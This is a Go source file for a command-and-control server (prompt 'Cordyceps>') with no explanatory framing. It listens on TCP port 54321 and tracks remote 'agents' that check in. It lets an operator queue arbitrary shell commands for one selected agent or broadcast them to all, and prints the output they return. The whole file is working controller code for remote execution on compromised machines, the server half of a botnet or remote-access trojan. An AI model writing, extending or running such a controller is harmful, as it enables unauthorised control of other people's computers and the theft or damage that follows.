package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

type agent struct {
	id       string
	ip       string
	lastSeen time.Time
	pending  []string
}

var (
	mu       sync.Mutex
	agents   = map[string]*agent{}
	selected = ""
)

const onlineThreshold = 30 * time.Second

func status(a *agent) string {
	if time.Since(a.lastSeen) <= onlineThreshold {
		return "ONLINE "
	}
	return "OFFLINE"
}

func handleConn(conn net.Conn) {
	defer conn.Close()
	scanner := bufio.NewScanner(conn)
	if !scanner.Scan() {
		return
	}
	line := strings.TrimSpace(scanner.Text())
	parts := strings.SplitN(line, " ", 3)

	switch parts[0] {
	case "CHECKIN":
		if len(parts) < 2 {
			return
		}
		id := parts[1]
		mu.Lock()
		a, ok := agents[id]
		if !ok {
			a = &agent{id: id, ip: conn.RemoteAddr().String()}
			agents[id] = a
			fmt.Printf("\n[+] %s  %s\n> ", id, a.ip)
		}
		a.lastSeen = time.Now()
		var cmd string
		if len(a.pending) > 0 {
			cmd = a.pending[0]
			a.pending = a.pending[1:]
		}
		mu.Unlock()
		if cmd != "" {
			fmt.Fprintf(conn, "CMD shell %s\n", cmd)
		} else {
			fmt.Fprintf(conn, "IDLE\n")
		}

	case "RESP":
		if len(parts) < 3 {
			return
		}
		id := parts[1]
		output := parts[2]
		fmt.Printf("\n[%s]\n%s\n> ", id, output)
	}
}

func listen(port string) {
	ln, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		fmt.Println("listen error:", err)
		os.Exit(1)
	}
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleConn(conn)
	}
}

func showAgents() {
	mu.Lock()
	defer mu.Unlock()
	if len(agents) == 0 {
		fmt.Println("no agents")
		return
	}
	fmt.Printf("\n%-4s %-8s %-24s %-22s %s\n", "#", "STATUS", "ID", "IP", "LAST SEEN")
	fmt.Println(strings.Repeat("-", 80))
	i := 1
	for _, a := range agents {
		fmt.Printf("%-4d %-8s %-24s %-22s %s\n",
			i, status(a), a.id, a.ip, a.lastSeen.Format("15:04:05"))
		i++
	}
	fmt.Println()
}

func queueCmd(id, cmd string) {
	mu.Lock()
	defer mu.Unlock()
	if a, ok := agents[id]; ok {
		a.pending = append(a.pending, cmd)
	}
}

func broadcast(cmd string) {
	mu.Lock()
	defer mu.Unlock()
	for _, a := range agents {
		a.pending = append(a.pending, cmd)
	}
	fmt.Printf("[broadcast] queued for %d agents\n", len(agents))
}

func cli() {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		if selected != "" {
			fmt.Printf("%s> ", selected)
		} else {
			fmt.Print("Cordyceps> ")
		}
		if !scanner.Scan() {
			break
		}
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, " ", 3)
		cmd := parts[0]

		switch cmd {
		case "show":
			showAgents()
		case "select":
			if len(parts) < 2 {
				fmt.Println("usage: select <id>")
				continue
			}
			selected = parts[1]
		case "exit":
			selected = ""
		case "broadcast":
			if len(parts) < 2 {
				fmt.Println("usage: broadcast <cmd>")
				continue
			}
			rest := strings.Join(parts[1:], " ")
			broadcast(rest)
		case "shell":
			if selected == "" {
				fmt.Println("select an agent first")
				continue
			}
			if len(parts) < 2 {
				fmt.Println("usage: shell <cmd>")
				continue
			}
			rest := strings.Join(parts[1:], " ")
			queueCmd(selected, rest)
		default:
			if selected != "" {
				queueCmd(selected, line)
			} else {
				fmt.Println("unknown command")
			}
		}
	}
}

func main() {
	go listen("54321")
	cli()
}
